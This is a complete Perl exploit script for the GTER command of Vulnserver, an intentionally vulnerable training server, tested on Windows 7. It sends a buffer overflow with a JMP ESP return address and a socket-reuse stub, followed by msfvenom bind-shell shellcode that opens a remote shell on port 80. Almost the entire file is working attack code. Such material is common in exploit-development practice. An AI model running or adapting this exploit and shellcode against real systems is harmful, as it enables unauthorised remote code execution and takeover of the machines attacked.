#!/usr/bin/perl

# Vulnserver GTER exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows 7 Professional

use IO::Socket;

if($ARGV[1] eq ''){
die("Proper usage: $0 IP_ADDRESS PORT \n\n");
}

$badheader = "GTER /.:/";
$baddata = "\x90" x 50; # exact offset at 147
$baddata .= "\x54\x59\x66\x81\xC1\xCC\x05\x83\xEC\x70\x33\xD2\x52\x80\xC6\x02\x52\x54\x5A\x66\x83\xC2\x50\x52\xFF\x31\xB8\x11\x2C\x25\x40\xC1\xE8\x08\xFF\xD0"; # CALL WS2_32.recv Socket = 5C BufSize = 200 (512.)

$baddata .= "\x90" x (147-length($baddata));

#  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- 
# (C:\Users\Vincent\Downloads\vulnserver\essfunc.dll)

$baddata .= "\x03\x12\x50\x62"; # JMP ESP
$baddata .= "\xeb\x98\x90\x90"; # short JMP back 103 bytes
$baddata .= "\x90" x 20;

# msfvenom -p windows/shell_bind_tcp -b "\x00\x0a\x0d" LPORT=80 -v payload -f perl EXITFUNC=seh
# Payload size: 355 bytes

$payload = "\xb8\xaf\x9b\xb3\x16\xda\xdd\xd9\x74\x24\xf4\x5b\x33\xc9" .
"\xb1\x53\x31\x43\x12\x83\xeb\xfc\x03\xec\x95\x51\xe3\x0e" .
"\x41\x17\x0c\xee\x92\x78\x84\x0b\xa3\xb8\xf2\x58\x94\x08" .
"\x70\x0c\x19\xe2\xd4\xa4\xaa\x86\xf0\xcb\x1b\x2c\x27\xe2" .
"\x9c\x1d\x1b\x65\x1f\x5c\x48\x45\x1e\xaf\x9d\x84\x67\xd2" .
"\x6c\xd4\x30\x98\xc3\xc8\x35\xd4\xdf\x63\x05\xf8\x67\x90" .
"\xde\xfb\x46\x07\x54\xa2\x48\xa6\xb9\xde\xc0\xb0\xde\xdb" .
"\x9b\x4b\x14\x97\x1d\x9d\x64\x58\xb1\xe0\x48\xab\xcb\x25" .
"\x6e\x54\xbe\x5f\x8c\xe9\xb9\xa4\xee\x35\x4f\x3e\x48\xbd" .
"\xf7\x9a\x68\x12\x61\x69\x66\xdf\xe5\x35\x6b\xde\x2a\x4e" .
"\x97\x6b\xcd\x80\x11\x2f\xea\x04\x79\xeb\x93\x1d\x27\x5a" .
"\xab\x7d\x88\x03\x09\xf6\x25\x57\x20\x55\x22\x94\x09\x65" .
"\xb2\xb2\x1a\x16\x80\x1d\xb1\xb0\xa8\xd6\x1f\x47\xce\xcc" .
"\xd8\xd7\x31\xef\x18\xfe\xf5\xbb\x48\x68\xdf\xc3\x02\x68" .
"\xe0\x11\xbe\x60\x47\xca\xdd\x8d\x37\xba\x61\x3d\xd0\xd0" .
"\x6d\x62\xc0\xda\xa7\x0b\x69\x27\x48\x33\x3a\xae\xae\x59" .
"\xaa\xe6\x79\xf5\x08\xdd\xb1\x62\x72\x37\xea\x04\x3b\x51" .
"\x2d\x2b\xbc\x77\x19\xbb\x37\x94\x9d\xda\x47\xb1\xb5\x8b" .
"\xd0\x4f\x54\xfe\x41\x4f\x7d\x68\xe1\xc2\x1a\x68\x6c\xff" .
"\xb4\x3f\x39\x31\xcd\xd5\xd7\x68\x67\xcb\x25\xec\x40\x4f" .
"\xf2\xcd\x4f\x4e\x77\x69\x74\x40\x41\x72\x30\x34\x1d\x25" .
"\xee\xe2\xdb\x9f\x40\x5c\xb2\x4c\x0b\x08\x43\xbf\x8c\x4e" .
"\x4c\xea\x7a\xae\xfd\x43\x3b\xd1\x32\x04\xcb\xaa\x2e\xb4" .
"\x34\x61\xeb\xca\xc5\xbb\xe6\x5b\x7c\x2e\x4b\x06\x7f\x85" .
"\x88\x3f\xfc\x2f\x71\xc4\x1c\x5a\x74\x80\x9a\xb7\x04\x99" .
"\x4e\xb7\xbb\x9a\x5a";

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server");

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader.$baddata);
print "Stage 1 [exploit] sent\n";
sleep(1);

$socket->send($payload);
print "Stage 2 [payload] sent\n";
